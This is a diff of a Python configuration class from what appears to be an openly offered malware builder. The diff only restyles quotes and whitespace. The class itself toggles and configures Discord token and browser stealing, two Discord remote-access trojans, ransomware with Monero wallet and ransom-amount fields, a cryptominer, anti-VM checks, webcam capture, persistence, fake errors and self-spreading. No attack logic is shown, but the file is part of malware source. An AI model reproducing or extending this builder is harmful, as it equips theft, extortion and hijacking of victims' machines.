@@ -1,23 +1,23 @@
 class Config:
     def __init__(self):
-        self.webhook = 'WEBHOOK_URL'
+        self.webhook = "WEBHOOK_URL"
 
         self.debug_mode = False
 
         self.rose_discord_rat = False
-        self.rose_discord_rat_socket_link = 'ROSE_DISCORD_RAT_SOCKET_LINK'
-        
+        self.rose_discord_rat_socket_link = "ROSE_DISCORD_RAT_SOCKET_LINK"
+
         self.knight_discord_rat = False
-        self.knight_discord_rat_bot_token = 'KNIGHT_DISCORD_RAT_BOT_TOKEN'
-        self.knight_discord_rat_channel_id = 'KNIGHT_DISCORD_RAT_CHANNEL_ID'
-        self.knight_discord_rat_listener_user_id = 'KNIGHT_DISCORD_RAT_LISTENER_USER_ID'
-        self.knight_discord_rat_prefix = 'KNIGHT_DISCORD_RAT_PREFIX'
+        self.knight_discord_rat_bot_token = "KNIGHT_DISCORD_RAT_BOT_TOKEN"
+        self.knight_discord_rat_channel_id = "KNIGHT_DISCORD_RAT_CHANNEL_ID"
+        self.knight_discord_rat_listener_user_id = "KNIGHT_DISCORD_RAT_LISTENER_USER_ID"
+        self.knight_discord_rat_prefix = "KNIGHT_DISCORD_RAT_PREFIX"
 
         self.ransomware = False
-        self.ransomware_email_adress = 'RANS0MWARE_EMAIL'
-        self.ransomware_monero_wallet_adress = 'RANSOMWARE_MONERO_ADRESS_'
-        self.ransomware_discord_webhook_url = 'RANSOMWARE_WEBHOOKURL'
-        self.ransomware_amount_of_money = 'RANSOMWARE_AMOUNT_0F_MONEY'
+        self.ransomware_email_adress = "RANS0MWARE_EMAIL"
+        self.ransomware_monero_wallet_adress = "RANSOMWARE_MONERO_ADRESS_"
+        self.ransomware_discord_webhook_url = "RANSOMWARE_WEBHOOKURL"
+        self.ransomware_amount_of_money = "RANSOMWARE_AMOUNT_0F_MONEY"
 
         self.discord_ping = False
         self.injection = False
@@ -56,7 +56,7 @@ class Config:
         return self.injection
 
     def get_token_stealing(self):
-        return self.token_stealing 
+        return self.token_stealing
 
     def get_browser_stealing(self):
         return self.browser_stealing
@@ -90,31 +90,31 @@ class Config:
 
     def get_rose_discord_rat_link(self):
         return self.rose_discord_rat_socket_link
-    
+
     def get_knight_discord_rat(self):
         return self.knight_discord_rat
-    
+
     def get_knight_discord_rat_bot_token(self):
         return self.knight_discord_rat_bot_token
-    
+
     def get_knight_discord_rat_channel_id(self):
         return self.knight_discord_rat_channel_id
-    
+
     def get_knight_discord_rat_listener_user_id(self):
         return self.knight_discord_rat_listener_user_id
-    
+
     def get_knight_discord_rat_prefix(self):
         return self.knight_discord_rat_prefix
-    
+
     def get_discord_ping(self):
         return self.discord_ping
 
     def get_screenshot(self):
         return self.screenshot
-    
+
     def get_start_up(self):
         return self.start_up
-    
+
     def get_xmr_miner(self):
         return self.xmr_miner
 
@@ -123,7 +123,7 @@ class Config:
 
     def get_fake_error(self):
         return self.fake_error
-    
+
     def get_nitro_auto_buy(self):
         return self.nitro_auto_buy
 
@@ -132,31 +132,31 @@ class Config:
 
     def get_antivm(self):
         return self.antivm
-    
+
     def get_webcam(self):
         return self.webcam
-    
+
     def get_ransomware_email_adress(self):
         return self.ransomware_email_adress
-    
+
     def get_ransomware_amount_of_money(self):
         return self.ransomware_amount_of_money
-    
+
     def get_ransomware_monero_wallet_adress(self):
         return self.ransomware_monero_wallet_adress
-    
+
     def get_ransomware_discord_webhook_url(self):
         return self.ransomware_discord_webhook_url
-    
+
     def get_ransomware(self):
         return self.ransomware
 
     def get_spread_malware(self):
         return self.spread_malware
-    
+
     def get_spread_malware_msg(self):
         return self.spread_malware_msg
-    
+
     def get_rose_melt_stub(self):
         return self.rose_melt_stub
 
